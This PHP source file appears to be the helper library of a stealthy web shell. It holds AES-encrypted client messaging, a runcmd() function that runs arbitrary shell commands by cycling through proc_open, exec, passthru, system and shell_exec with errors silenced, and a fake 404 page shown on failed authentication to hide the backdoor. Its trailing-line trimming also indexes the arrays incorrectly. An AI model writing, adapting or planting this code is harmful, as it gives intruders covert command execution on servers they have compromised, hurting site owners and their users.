<?php

/**
 * ==========================================================================
 *  Function check
 *      Checks if a function exists and is callable.
 * ==========================================================================
 */

function checkfunc($func) {
    return function_exists($func) && is_callable($func);
}


/**
 * ==========================================================================
 *  Encryption
 * ==========================================================================
 */

/**
 * Encrypts a string with the provided key and using AES-256-CBC mode.
 * The cipher mode can be changed, but this one is a not-that-bad choice.
 */
function strencrypt($plaintext, $b64_key, $cipher="AES-256-CBC") {
    $key = base64_decode($b64_key);
    $iv = @openssl_random_pseudo_bytes(@openssl_cipher_iv_length($cipher));
    $ciphertext_raw = @openssl_encrypt($plaintext, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
    $hmac = @hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);

    return base64_encode($iv.$hmac.$ciphertext_raw);
}

/**
 * Decrypts a ciphertext with the provided key and using AES-256-CBC mode.
 * The cipher mode can be changed, but this one is a not-that-bad choice.
 */
function strdecrypt($ciphertext, $b64_key, $cipher="AES-256-CBC") {
    $key = base64_decode($b64_key);
    $tmp = base64_decode($ciphertext);
    $hashlen = 32;
    $ivlen = @openssl_cipher_iv_length($cipher);

    $iv = substr($tmp, 0, $ivlen);
    $hmac = substr($tmp, $ivlen, $hashlen);
    $ciphertext_raw = substr($tmp, $ivlen+$hashlen);

    $plaintext = @openssl_decrypt($ciphertext_raw, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
    $checkmac = @hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);

    return @hash_equals($hmac, $checkmac) ? $plaintext : null;
}


/**
 * ==========================================================================
 *  Commands
 * ==========================================================================
 */

/**
 * Runs a command using "proc_open()".
 * Best option because we get exitcode + stdout + stderr.
 */
function _run_proc_open($command) {
    $descriptorspec = array(
        1 => array("pipe", "w"),  // stdout
        2 => array("pipe", "w"),  // stderr
    );
    $proc = @proc_open($command, $descriptorspec, $pipes);

    $stdout = @stream_get_contents($pipes[1]);
    @fclose($pipes[1]);

    $stderr = @stream_get_contents($pipes[2]);
    @fclose($pipes[2]);

    return array(
        "method" => "proc_open",
        "exit" => @proc_close($proc),
        "stdout" => explode("\n", $stdout),
        "stderr" => explode("\n", $stderr)
    );
}

/**
 * Runs a command using "exec()".
 * We can't get the stderr in this case.
 */
function _run_exec($command) {
    @exec($command, $stdout, $exitcode);

    return array(
        "method" => "exec",
        "exit" => $exitcode,
        "stdout" => $stdout,
        "stderr" => []
    );
}

/**
 * Runs a command using "passthru()".
 * We can't get the stderr in this case.
 */
function _run_passthru($command) {
    @ob_start();
    @passthru($command, $exitcode);
    $stdout = @ob_get_contents();
    @ob_end_clean();

    return array(
        "method" => "passthru",
        "exit" => $exitcode,
        "stdout" => explode("\n", $stdout),
        "stderr" => []
    );
}

/**
 * Runs a command using "system()".
 * We can't get the stderr in this case.
 */
function _run_system($command) {
    @ob_start();
    @system($command, $exitcode);
    $stdout = @ob_get_contents();
    @ob_end_clean();

    return array(
        "method" => "system",
        "exit" => $exitcode,
        "stdout" => explode("\n", $stdout),
        "stderr" => []
    );
}

/**
 * Runs a command using "shell_exec()".
 * Not very interesting because we get only the stdout.
 */
function _run_shell_exec($command) {
    $stdout = @shell_exec($command);

    return array(
        "method" => "shell_exec",
        "exit" => null,
        "stdout" => explode("\n", $stdout),
        "stderr" => []
    );
}

/**
 * Runs the specified command using the prefered methods.
 * In case the best option is not available, jump to next option, and so on.
 */
function runcmd($command) {
    if (checkfunc('proc_open') && checkfunc('stream_get_contents')) {
        $tmp = _run_proc_open($command);
    }
    elseif (checkfunc('exec')) {
        $tmp = _run_exec($command);
    }
    elseif (checkfunc('passthru')) {
        $tmp = _run_passthru($command);
    }
    elseif (checkfunc('system')) {
        $tmp = _run_system($command);
    }
    elseif (checkfunc('shell_exec')) {
        $tmp = _run_shell_exec($command);
    }
    else {
        return null;
    }

    // Suppress eventual last empty line of output
    if (count($tmp['stdout']) && empty($tmp['stdout'][count($tmp)-1])) {
        array_pop($tmp['stdout']);
    }
    if (count($tmp['stderr']) && empty($tmp['stderr'][count($tmp)-1])) {
        array_pop($tmp['stderr']);
    }

    return $tmp;
}


/**
 * ==========================================================================
 *  Helpers
 * ==========================================================================
 */

/**
 * Sends a fake web 404 error in case of auth failure.
 * You may replace it with what you want (fake JS/CSS resource, redirection...)
 */
function fail() {
    http_response_code(404);
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
    exit;
}

/**
 * Returns back (to client) a JSON encoded response.
 */
function jsonback($arr) {
    global $SECRET_KEY;
    return strencrypt(json_encode($arr), $SECRET_KEY);
}
